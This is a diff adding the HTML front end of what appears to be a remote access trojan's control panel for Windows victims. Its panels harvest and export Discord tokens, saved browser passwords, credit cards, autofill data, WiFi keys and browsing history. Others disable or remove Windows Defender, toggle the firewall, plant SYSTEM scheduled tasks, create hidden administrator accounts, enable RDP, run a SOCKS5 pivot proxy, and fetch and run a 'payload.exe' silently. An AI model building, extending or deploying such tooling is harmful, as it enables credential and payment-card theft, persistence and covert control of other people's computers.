+    <div class="sxt-list" id="ports-list"><div class="sxt-empty">Loading…</div></div>
+    <div class="sxt-statusbar" id="ports-status">—</div>
+  </div>
+</div>
+
+<div class="fp-modal" id="fp-socks5" style="width:560px;height:640px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-socks5">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-server mem-title-ico"></i>
+        <span class="mem-title-text">Proxy (SOCKS5)</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('socks5')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="s5-form">
+      <div class="s5-field">
+        <label>Bind</label>
+        <select id="socks5-bind" class="mem-input" style="width:200px">
+          <option value="0.0.0.0">All interfaces (shareable)</option>
+          <option value="127.0.0.1">This machine only (127.0.0.1)</option>
+        </select>
+      </div>
+      <div class="s5-field">
+        <label>Port</label>
+        <select id="socks5-port-mode" class="mem-input" style="width:92px" onchange="socks5PortModeChange()">
+          <option value="auto">Auto</option>
+          <option value="manual">Manual</option>
+        </select>
+      </div>
+      <div class="s5-field" id="socks5-port-wrap" style="display:none">
+        <label>Number</label>
+        <input id="socks5-port" class="mem-input" type="text" placeholder="1080" autocomplete="off" spellcheck="false" style="width:80px">
+      </div>
+      <button id="socks5-toggle" class="mem-btn-run" type="button" onclick="socks5Toggle()">
+        <i class="fa-solid fa-play"></i> Start
+      </button>
+    </div>
+    <div style="padding:0 18px 6px;display:flex;flex-direction:column;gap:2px;flex-shrink:0">
+      <label class="url-opt" id="socks5-fb-wrap" style="display:none"><input type="checkbox" id="socks5-fallback" checked> <span>Fall back to an automatic port if this one is busy</span></label>
+      <details class="mem-advanced" id="socks5-adv" style="margin-top:2px">
+        <summary>Settings — authentication &amp; access</summary>
+        <div class="mem-file-row" style="gap:8px;margin-top:6px">
+          <input id="socks5-user" class="mem-input" type="text" placeholder="Username (optional)" style="flex:1" autocomplete="off" spellcheck="false">
+          <input id="socks5-pass" class="mem-input" type="password" placeholder="Password" style="flex:1" autocomplete="new-password">
+        </div>
+        <div style="font-size:11px;color:var(--mute);margin-top:6px">Set a username/password so the proxy isn't open to the whole LAN (SOCKS5 RFC 1929 auth).</div>
+      </details>
+    </div>
+    <div id="socks5-conn" style="display:none;margin:4px 18px 8px;padding:8px 12px;border:1px solid var(--accent-border);border-radius:var(--rounded-sm);background:var(--accent-soft);flex-shrink:0">
+      <div style="font-size:11px;color:var(--mute);text-transform:uppercase;letter-spacing:.06em;font-family:var(--font-mono);margin-bottom:4px">Connect from another machine</div>
+      <div style="display:flex;align-items:center;gap:8px">
+        <code id="socks5-conn-str" style="flex:1;font-family:var(--font-mono);font-size:12.5px;color:var(--accent-hover);user-select:text;overflow:hidden;text-overflow:ellipsis">—</code>
+        <button class="tbtn" onclick="socks5CopyConn()" title="Copy proxy address"><i class="fa-regular fa-copy"></i></button>
+      </div>
+      <div id="socks5-conn-alt" style="font-family:var(--font-mono);font-size:11px;color:var(--mute);margin-top:4px"></div>
+    </div>
+    <div style="padding:0 18px 10px;font-size:11.5px;color:var(--mute);line-height:1.7;flex-shrink:0">
+      Bind <b>All interfaces</b> and start — then use this PC's IP and the shown port as a SOCKS5 proxy
+      on the other machine. Listening on a high port needs <b>no admin</b>. If the Windows Firewall
+      prompt appears it must be allowed once on the target (or pre-open the port via Firewall Control,
+      which does need admin). Raw TCP can't traverse the Cloudflare tunnel — over the tunnel use the
+      WebSocket bridge at <code style="font-family:var(--font-mono);color:var(--accent-hover)">/ws/socks</code> with
+      <code style="font-family:var(--font-mono);color:var(--accent-hover)">websocat</code> instead.
+    </div>
+    <div class="s5-list" id="socks5-list"><div class="sxt-empty">Server is stopped</div></div>
+    <div class="sxt-statusbar" id="socks5-status">Stopped</div>
+  </div>
+</div>
+
+<div class="fp-modal" id="fp-regedit" style="width:1000px;height:620px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-regedit">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-database mem-title-ico"></i>
+        <span class="mem-title-text">Registry Editor</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('regedit')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="sxt-toolbar">
+      <button class="sxt-refresh" onclick="regNewKey()"><i class="fa-solid fa-folder-plus"></i> New Key</button>
+      <button class="sxt-refresh" onclick="regNewValue()"><i class="fa-solid fa-square-plus"></i> New Value</button>
+      <button class="sxt-refresh" id="reg-del-key-btn" onclick="regDeleteKey()"><i class="fa-solid fa-trash-can"></i> Delete Key</button>
+    </div>
+    <div class="reg-path"><i class="fa-solid fa-location-dot"></i><span id="reg-path-text">—</span></div>
+    <div class="reg-wrap">
+      <div class="reg-tree" id="reg-tree"></div>
+      <div class="reg-pane">
+        <div class="sxt-head">
+          <span class="sxt-th reg-val-name">Name</span>
+          <span class="sxt-th reg-val-type">Type</span>
+          <span class="sxt-th reg-val-data">Data</span>
+        </div>
+        <div class="sxt-list" id="reg-vals"><div class="sxt-empty">Select a key</div></div>
+      </div>
+    </div>
+    <div class="reg-statusbar" id="reg-status">—</div>
+  </div>
+</div>
+
+<div class="fp-modal" id="fp-regedit-edit" style="width:560px;height:400px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-regedit-edit">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-pen-to-square mem-title-ico"></i>
+        <span class="mem-title-text" id="regedit-edit-title">Edit Value</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('regedit-edit')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="mem-body">
+      <div class="mem-form">
+        <span class="mem-label">Key</span>
+        <input id="regedit-key" class="mem-input" type="text" readonly style="opacity:.6;cursor:default">
+
+        <span class="mem-label">Value Name (empty = Default)</span>
+        <input id="regedit-name" class="mem-input" type="text" autocomplete="off" spellcheck="false">
+
+        <span class="mem-label">Type</span>
+        <select id="regedit-type" class="mem-input">
+          <option value="REG_SZ">REG_SZ</option>
+          <option value="REG_EXPAND_SZ">REG_EXPAND_SZ</option>
+          <option value="REG_MULTI_SZ">REG_MULTI_SZ</option>
+          <option value="REG_DWORD">REG_DWORD</option>
+          <option value="REG_QWORD">REG_QWORD</option>
+          <option value="REG_BINARY">REG_BINARY</option>
+        </select>
+
+        <span class="mem-label">Data</span>
+        <textarea id="regedit-data" class="mem-input" spellcheck="false"></textarea>
+
+        <div class="mem-actions">
+          <span class="mem-hint" id="regedit-hint">DWORD/QWORD accept decimal or 0x… hex. MULTI_SZ: one entry per line. BINARY: hex bytes.</span>
+          <button id="regedit-del-btn" class="mem-btn-stop" type="button" onclick="regDeleteValue()">
+            <i class="fa-solid fa-trash-can"></i> Delete
+          </button>
+          <button class="mem-btn-run" type="button" onclick="regSaveValue()">
+            <i class="fa-solid fa-floppy-disk"></i> Save
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<div class="fp-modal" id="fp-tokens" style="width:900px;height:560px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-tokens">
+      <div class="mem-title-left">
+        <i class="fa-brands fa-discord mem-title-ico" style="color:#5865f2"></i>
+        <span class="mem-title-text">Discord Tokens</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('tokens')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="sxt-toolbar">
+      <div class="sxt-search">
+        <i class="fa-solid fa-magnifying-glass"></i>
+        <input type="search" id="tk-search" placeholder="Filter by user, source, email, token…" oninput="tkRender()">
+      </div>
+      <button class="sxt-refresh" id="tk-reveal-btn" onclick="tkToggleReveal()"><i class="fa-solid fa-eye"></i> Show</button>
+      <button class="sxt-refresh" onclick="tkCopyAll()"><i class="fa-solid fa-copy"></i> Copy</button>
+      <button class="sxt-refresh" onclick="tkCsv()" title="Export as CSV"><i class="fa-solid fa-file-csv"></i> CSV</button>
+      <button class="sxt-refresh" onclick="tkLoad(true)"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+    </div>
+    <div class="sxt-head">
+      <span class="sxt-th tk-user">User</span>
+      <span class="sxt-th tk-src">Source</span>
+      <span class="sxt-th tk-mail">Email</span>
+      <span class="sxt-th tk-2fa">2FA</span>
+      <span class="sxt-th tk-nitro">Nitro</span>
+      <span class="sxt-th tk-token">Token</span>
+    </div>
+    <div class="sxt-list" id="tk-list"><div class="sxt-empty">Open to scan Discord tokens…</div></div>
+    <div class="sxt-statusbar" id="tk-status">—</div>
+  </div>
+</div>
+
+<div class="fp-modal" id="fp-passwords" style="width:900px;height:560px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-passwords">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-key mem-title-ico"></i>
+        <span class="mem-title-text">Saved Passwords</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('passwords')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="sxt-toolbar">
+      <div class="sxt-search">
+        <i class="fa-solid fa-magnifying-glass"></i>
+        <input type="search" id="pw-search" placeholder="Filter by browser, URL, user or password…" oninput="pwRender()">
+      </div>
+      <button class="sxt-refresh" id="pw-reveal-btn" onclick="pwToggleReveal()"><i class="fa-solid fa-eye"></i> Show</button>
+      <button class="sxt-refresh" onclick="pwCopyAll()"><i class="fa-solid fa-copy"></i> Copy</button>
+      <button class="sxt-refresh" onclick="pwCsv()" title="Export as CSV"><i class="fa-solid fa-file-csv"></i> CSV</button>
+      <button class="sxt-refresh" onclick="pwLoad(true)"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+    </div>
+    <div class="sxt-head">
+      <span class="sxt-th pw-browser">Browser</span>
+      <span class="sxt-th pw-url">URL</span>
+      <span class="sxt-th pw-user">User</span>
+      <span class="sxt-th pw-pass">Password</span>
+    </div>
+    <div class="sxt-list" id="pw-list"><div class="sxt-empty">Open to scan saved passwords from all browsers…</div></div>
+    <div class="sxt-statusbar" id="pw-status">—</div>
+  </div>
+</div>
+
+<div class="fp-modal" id="fp-autofill" style="width:900px;height:560px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-autofill">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-credit-card mem-title-ico"></i>
+        <span class="mem-title-text">Cards &amp; Autofill</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('autofill')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="sxt-toolbar">
+      <div class="sxt-search"><i class="fa-solid fa-magnifying-glass"></i>
+        <input type="search" id="af-search" placeholder="Filter…" oninput="afRender()">
+      </div>
+      <button class="sxt-refresh" title="Copy all entries" onclick="afCopyAll()"><i class="fa-solid fa-copy"></i> Copy</button>
+      <button class="sxt-refresh" title="Export as CSV" onclick="afCsv()"><i class="fa-solid fa-file-csv"></i> CSV</button>
+      <button class="sxt-refresh" title="Re-scan" onclick="afLoad(true)"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+    </div>
+    <div class="bot-tabs" style="padding:0 14px">
+      <div class="bot-tab active" id="af-tab-cards" onclick="afTab('cards')">Credit cards</div>
+      <div class="bot-tab" id="af-tab-fills" onclick="afTab('fills')">Autofill</div>
+    </div>
+    <div id="af-pane-cards" style="flex:1;display:flex;flex-direction:column;min-height:0">
+      <div class="sxt-head"><span class="sxt-th af-browser">Browser</span><span class="sxt-th af-name">Name</span><span class="sxt-th af-num">Number</span><span class="sxt-th af-exp">Expires</span></div>
+      <div class="sxt-list" id="af-cards-list"></div>
+    </div>
+    <div id="af-pane-fills" style="flex:1;display:none;flex-direction:column;min-height:0">
+      <div class="sxt-head"><span class="sxt-th af-browser">Browser</span><span class="sxt-th af-name">Field</span><span class="sxt-th af-val">Value</span></div>
+      <div class="sxt-list" id="af-fills-list"></div>
+    </div>
+    <div class="sxt-statusbar" id="af-status">—</div>
+  </div>
+</div>
+
+<!-- ── Defender Control ── -->
+<div class="fp-modal" id="fp-defender" style="width:660px;height:700px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-defender">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-shield-virus mem-title-ico"></i>
+        <span class="mem-title-text">Defender Control</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('defender')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="sxt-toolbar">
+      <button class="sxt-refresh def-danger" onclick="defSetAll(false)"><i class="fa-solid fa-power-off"></i> Disable All</button>
+      <button class="sxt-refresh" onclick="defSetAll(true)"><i class="fa-solid fa-power-off"></i> Enable All</button>
+      <button class="sxt-refresh" onclick="defExcludeAdd()"><i class="fa-solid fa-folder-plus"></i> Add Exclusion</button>
+      <button class="sxt-refresh" onclick="defLoad(true)"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+    </div>
+    <div class="si-grid" id="def-status-grid" style="flex:none;max-height:118px"><div class="si-loading">Loading…</div></div>
+    <div class="sxt-head" style="border-top:1px solid var(--hairline)">
+      <span class="sxt-th" style="flex:1">Feature</span>
+      <span class="sxt-th" style="width:90px;text-align:center">State</span>
+      <span class="sxt-th" style="width:92px;text-align:center">Action</span>
+    </div>
+    <div class="sxt-list" id="def-feature-list" style="flex:1 1 auto;min-height:60px"><div class="sxt-empty">Loading…</div></div>
+    <div class="sxt-head" style="border-top:1px solid var(--hairline)"><span class="sxt-th" style="flex:1">Path Exclusions</span></div>
+    <div class="sxt-list" id="def-excl-list" style="flex:none;height:62px"><div class="sxt-empty">—</div></div>
+    <div class="sxt-toolbar" style="border-top:1px solid var(--hairline)">
+      <button class="sxt-refresh def-danger" onclick="defRemove()"><i class="fa-solid fa-skull-crossbones"></i> Remove Windows Defender</button>
+      <button class="sxt-refresh" onclick="defRestore()"><i class="fa-solid fa-screwdriver-wrench"></i> Restore / Repair</button>
+    </div>
+    <div class="sxt-list" id="def-steps" style="flex:none;max-height:130px;display:none"></div>
+    <div class="sxt-statusbar" id="def-status">—</div>
+  </div>
+</div>
+
+<!-- ── Firewall Control ── -->
+<div class="fp-modal" id="fp-firewall" style="width:560px;height:500px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-firewall">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-fire-flame-curved mem-title-ico"></i>
+        <span class="mem-title-text">Firewall Control</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('firewall')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="sxt-toolbar">
+      <button class="sxt-refresh" id="fw-toggle-btn" onclick="fwToggle()"><i class="fa-solid fa-power-off"></i> Toggle Firewall</button>
+      <button class="sxt-refresh" onclick="fwLoad()"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+    </div>
+    <div class="si-grid" id="fw-profiles" style="flex:none;max-height:140px"><div class="si-loading">Loading…</div></div>
+    <div class="mem-form" style="padding:12px 18px">
+      <span class="mem-label">Add allow rule</span>
+      <div class="mem-file-row" style="gap:6px">
+        <input id="fw-rule-name" class="mem-input" type="text" placeholder="Rule name" style="flex:1.2" autocomplete="off" spellcheck="false">
+        <input id="fw-rule-port" class="mem-input" type="text" placeholder="Port" style="width:80px" autocomplete="off" spellcheck="false">
+        <select id="fw-rule-proto" class="mem-input" style="width:80px"><option value="TCP">TCP</option><option value="UDP">UDP</option></select>
+        <select id="fw-rule-dir" class="mem-input" style="width:90px"><option value="in">Inbound</option><option value="out">Outbound</option></select>
+        <button class="tbtn mem-file-btn" onclick="fwRuleAdd()"><i class="fa-solid fa-plus"></i> Add</button>
+      </div>
+      <div class="mem-file-row" style="gap:6px;margin-top:8px">
+        <input id="fw-rule-del" class="mem-input" type="text" placeholder="Rule name to delete…" style="flex:1" autocomplete="off" spellcheck="false" onkeydown="if(event.key==='Enter')fwRuleDelete()">
+        <button class="tbtn danger" onclick="fwRuleDelete()"><i class="fa-solid fa-trash-can"></i> Delete Rule</button>
+      </div>
+    </div>
+    <div class="sxt-statusbar" id="fw-status">—</div>
+  </div>
+</div>
+
+<!-- ── Scheduled Tasks ── -->
+<div class="fp-modal" id="fp-tasks" style="width:960px;height:580px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-tasks">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-clock mem-title-ico"></i>
+        <span class="mem-title-text">Scheduled Tasks</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('tasks')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="sxt-toolbar">
+      <div class="sxt-search">
+        <i class="fa-solid fa-magnifying-glass"></i>
+        <input type="search" id="task-search" placeholder="Filter by name, command, author…" oninput="taskRender()">
+      </div>
+      <button class="sxt-refresh" id="task-create-btn" onclick="taskCreateToggle()"><i class="fa-solid fa-plus"></i> Create</button>
+      <button class="sxt-refresh" onclick="taskLoad()"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+    </div>
+    <div class="mem-form" id="task-create-form" style="display:none;padding:12px 18px;border-bottom:1px solid var(--hairline)">
+      <div class="mem-file-row" style="gap:6px">
+        <input id="task-new-name" class="mem-input" type="text" placeholder="Task name" style="flex:1" autocomplete="off" spellcheck="false">
+        <input id="task-new-cmd" class="mem-input" type="text" placeholder="Command to run (exe + args)" style="flex:2" autocomplete="off" spellcheck="false">
+      </div>
+      <div class="mem-file-row" style="gap:8px;margin-top:8px;align-items:center">
+        <select id="task-new-sched" class="mem-input" style="width:120px">
+          <option value="onlogon">On logon</option>
+          <option value="onstart">On startup</option>
+          <option value="daily">Daily</option>
+          <option value="once">Once</option>
+        </select>
+        <input id="task-new-time" class="mem-input" type="text" placeholder="HH:MM" style="width:70px" autocomplete="off" spellcheck="false">
+        <label class="url-opt"><input type="checkbox" id="task-new-highest"> <span>Highest</span></label>
+        <label class="url-opt"><input type="checkbox" id="task-new-system"> <span>SYSTEM</span></label>
+        <button class="tbtn mem-file-btn" onclick="taskCreate()"><i class="fa-solid fa-plus"></i> Create Task</button>
+      </div>
+    </div>
+    <div class="sxt-head">
+      <span class="sxt-th" style="width:230px">Name</span>
+      <span class="sxt-th" style="width:90px">Status</span>
+      <span class="sxt-th" style="width:150px">Next Run</span>
+      <span class="sxt-th" style="width:110px">Run As</span>
+      <span class="sxt-th" style="flex:1">Command</span>
+      <span class="sxt-th" style="width:96px"></span>
+    </div>
+    <div class="sxt-list" id="task-list"><div class="sxt-empty">Loading…</div></div>
+    <div class="sxt-statusbar" id="task-status">—</div>
+  </div>
+</div>
+
+<!-- ── Local Users & RDP ── -->
+<div class="fp-modal" id="fp-users" style="width:820px;height:560px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-users">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-users-gear mem-title-ico"></i>
+        <span class="mem-title-text">Local Users & RDP</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('users')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="sxt-toolbar">
+      <div class="sxt-search">
+        <i class="fa-solid fa-magnifying-glass"></i>
+        <input type="search" id="user-search" placeholder="Filter by name or comment…" oninput="usersRender()">
+      </div>
+      <button class="sxt-refresh" id="rdp-toggle-btn" onclick="rdpToggle()"><i class="fa-solid fa-tower-cell"></i> RDP</button>
+      <button class="sxt-refresh" onclick="userAddToggle()"><i class="fa-solid fa-user-plus"></i> Add User</button>
+      <button class="sxt-refresh" onclick="usersLoad()"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+    </div>
+    <div class="mem-form" id="user-add-form" style="display:none;padding:12px 18px;border-bottom:1px solid var(--hairline)">
+      <div class="mem-file-row" style="gap:8px;align-items:center">
+        <input id="user-new-name" class="mem-input" type="text" placeholder="Username (suffix $ to hide)" style="flex:1" autocomplete="off" spellcheck="false">
+        <input id="user-new-pass" class="mem-input" type="password" placeholder="Password" style="flex:1" autocomplete="new-password">
+        <label class="url-opt"><input type="checkbox" id="user-new-admin" checked> <span>Administrator</span></label>
+        <button class="tbtn mem-file-btn" onclick="userAdd()"><i class="fa-solid fa-user-plus"></i> Create</button>
+      </div>
+      <div style="font-size:11px;color:var(--mute);margin-top:6px">Names ending in <b>$</b> are hidden from NetUserEnum and the logon screen.</div>
+    </div>
+    <div class="sxt-head">
+      <span class="sxt-th" style="width:170px">Username</span>
+      <span class="sxt-th" style="width:64px">Admin</span>
+      <span class="sxt-th" style="width:64px">Active</span>
+      <span class="sxt-th" style="flex:1">Comment</span>
+      <span class="sxt-th" style="width:216px"></span>
+    </div>
+    <div class="sxt-list" id="user-list"><div class="sxt-empty">Loading…</div></div>
+    <div class="sxt-statusbar" id="user-status">—</div>
+  </div>
+</div>
+
+<!-- ── Sessions ── -->
+<div class="fp-modal" id="fp-sessions" style="width:640px;height:440px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-sessions">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-user-clock mem-title-ico"></i>
+        <span class="mem-title-text">Sessions</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('sessions')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="sxt-toolbar">
+      <button class="sxt-refresh" onclick="sessLoad()"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+    </div>
+    <div class="sxt-head">
+      <span class="sxt-th" style="width:56px">ID</span>
+      <span class="sxt-th" style="flex:1">User</span>
+      <span class="sxt-th" style="width:100px">Session</span>
+      <span class="sxt-th" style="width:110px">State</span>
+      <span class="sxt-th" style="width:130px"></span>
+    </div>
+    <div class="sxt-list" id="sess-list"><div class="sxt-empty">Loading…</div></div>
+    <div class="sxt-statusbar" id="sess-status">—</div>
+  </div>
+</div>
+
+<!-- ── WiFi Passwords ── -->
+<div class="fp-modal" id="fp-wifi" style="width:700px;height:500px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-wifi">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-wifi mem-title-ico"></i>
+        <span class="mem-title-text">WiFi Passwords</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('wifi')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="sxt-toolbar">
+      <div class="sxt-search">
+        <i class="fa-solid fa-magnifying-glass"></i>
+        <input type="search" id="wifi-search" placeholder="Filter by SSID or auth…" oninput="wifiRender()">
+      </div>
+      <button class="sxt-refresh" onclick="wifiCopyAll()"><i class="fa-solid fa-copy"></i> Copy All</button>
+      <button class="sxt-refresh" onclick="wifiCsv()" title="Export as CSV"><i class="fa-solid fa-file-csv"></i> CSV</button>
+      <button class="sxt-refresh" onclick="wifiLoad()"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+    </div>
+    <div class="sxt-head">
+      <span class="sxt-th" style="flex:1.2">SSID</span>
+      <span class="sxt-th" style="width:150px">Authentication</span>
+      <span class="sxt-th" style="flex:1">Key</span>
+    </div>
+    <div class="sxt-list" id="wifi-list"><div class="sxt-empty">Loading…</div></div>
+    <div class="sxt-statusbar" id="wifi-status">—</div>
+  </div>
+</div>
+
+<!-- ── Browser History ── -->
+<div class="fp-modal" id="fp-history" style="width:1000px;height:580px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-history">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-clock-rotate-left mem-title-ico"></i>
+        <span class="mem-title-text">Browser History</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('history')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="sxt-toolbar">
+      <div class="sxt-search">
+        <i class="fa-solid fa-magnifying-glass"></i>
+        <input type="search" id="hist-search" placeholder="Filter by URL, domain or title…" oninput="histRender()">
+      </div>
+      <select id="hist-browser" onchange="histRender()" style="width:130px"><option value="">All browsers</option></select>
+      <select id="hist-sort" onchange="histRender()" style="width:120px">
+        <option value="last">Most recent</option>
+        <option value="visits">Most visited</option>
+      </select>
+      <button class="sxt-refresh" onclick="histCopyAll()"><i class="fa-solid fa-copy"></i> Copy</button>
+      <button class="sxt-refresh" onclick="histCsv()" title="Export as CSV"><i class="fa-solid fa-file-csv"></i> CSV</button>
+      <button class="sxt-refresh" onclick="histLoad(true)"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+    </div>
+    <div class="sxt-head">
+      <span class="sxt-th" style="width:90px">Browser</span>
+      <span class="sxt-th" style="flex:1.6">URL</span>
+      <span class="sxt-th" style="flex:1">Title</span>
+      <span class="sxt-th" style="width:56px">Visits</span>
+      <span class="sxt-th" style="width:150px">Last Visit</span>
+    </div>
+    <div class="sxt-list" id="hist-list"><div class="sxt-empty">Loading…</div></div>
+    <div class="sxt-statusbar" id="hist-status">—</div>
+  </div>
+</div>
+
+<!-- ── Recent Documents ── -->
+<div class="fp-modal" id="fp-recent" style="width:680px;height:520px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-recent">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-file-lines mem-title-ico"></i>
+        <span class="mem-title-text">Recent Documents</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('recent')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="sxt-toolbar">
+      <div class="sxt-search">
+        <i class="fa-solid fa-magnifying-glass"></i>
+        <input type="search" id="recent-search" placeholder="Filter by name…" oninput="recentRender()">
+      </div>
+      <button class="sxt-refresh" onclick="recentLoad()"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+    </div>
+    <div class="sxt-head">
+      <span class="sxt-th" style="flex:1">Document</span>
+      <span class="sxt-th" style="width:150px">Opened</span>
+    </div>
+    <div class="sxt-list" id="recent-list"><div class="sxt-empty">Loading…</div></div>
+    <div class="sxt-statusbar" id="recent-status">—</div>
+  </div>
+</div>
+
+<!-- ── Run Exe / Fetch & Run ── -->
+<div class="fp-modal" id="fp-runexe" style="width:600px;height:460px">
+  <div class="modal-content mem-modal">
+    <div class="modal-header mem-titlebar" id="fph-runexe">
+      <div class="mem-title-left">
+        <i class="fa-solid fa-file-export mem-title-ico"></i>
+        <span class="mem-title-text">Run Exe / Fetch & Run</span>
+      </div>
+      <button class="mem-title-close" onclick="fpClose('runexe')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="tm11-tabs">
+      <div class="tm11-tab tm11-tab-active" id="re-tab-local" onclick="runExeTab('local')"><i class="fa-solid fa-hard-drive" style="font-size:12px"></i> Local File</div>
+      <div class="tm11-tab" id="re-tab-url" onclick="runExeTab('url')"><i class="fa-solid fa-cloud-arrow-down" style="font-size:12px"></i> From URL</div>
+    </div>
+    <div class="mem-body">
+      <div class="mem-form" id="re-panel-local">
+        <span class="mem-label">Full path on the remote machine</span>
+        <input id="re-path" class="mem-input" type="text" placeholder="C:\path\to\program.exe" autocomplete="off" spellcheck="false">
+        <span class="mem-label">Arguments (optional)</span>
+        <input id="re-args" class="mem-input" type="text" placeholder="" autocomplete="off" spellcheck="false">
+        <label class="url-opt" style="margin-top:8px"><input type="checkbox" id="re-hidden"> <span>Run hidden (no window)</span></label>
+        <div class="mem-actions">
+          <span class="mem-hint" id="re-local-status">ShellExecutes the file on the target.</span>
+          <button class="mem-btn-run" type="button" onclick="runExeLocal()"><i class="fa-solid fa-play"></i> Run</button>
+        </div>
+      </div>
+      <div class="mem-form" id="re-panel-url" style="display:none">
+        <span class="mem-label">Download URL</span>
+        <input id="re-url" class="mem-input" type="text" placeholder="https://host/payload.exe" autocomplete="off" spellcheck="false" oninput="reUrlPrefill()">
+        <span class="mem-label">Save as</span>
+        <input id="re-saveas" class="mem-input" type="text" placeholder="C:\Users\Public\Downloads\payload.exe" autocomplete="off" spellcheck="false">
+        <span class="mem-label">Arguments (optional)</span>
+        <input id="re-url-args" class="mem-input" type="text" placeholder="" autocomplete="off" spellcheck="false">
+        <label class="url-opt" style="margin-top:8px"><input type="checkbox" id="re-url-run" checked> <span>Execute after download</span></label>
+        <label class="url-opt"><input type="checkbox" id="re-url-hidden" checked> <span>Run hidden (no window)</span></label>
+        <div class="mem-actions">
+          <span class="mem-hint" id="re-url-status">The client downloads the file itself, then optionally runs it.</span>
+          <button class="mem-btn-run" type="button" onclick="runExeFetch()"><i class="fa-solid fa-cloud-arrow-down"></i> Fetch & Run</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="/viewer.js"></script>
+
+</body>
+</html>
